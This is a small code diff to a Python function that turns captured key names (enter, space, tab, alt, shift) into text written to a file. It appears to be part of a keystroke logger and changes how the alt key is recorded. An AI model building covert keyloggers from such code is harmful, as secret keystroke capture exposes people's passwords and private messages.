@@ -9,7 +9,7 @@ def writetofile(key):
     letter = letter.replace("Key.enter","\n")
     letter = letter.replace("Key.space"," ")
     letter = letter.replace("Key.tab","\t")
-    letter = letter.replace("Key.alt","")
+    letter = letter.replace("Key.alt","alt")
     letter = letter.replace("Key.shift","")
 
     # arrow key
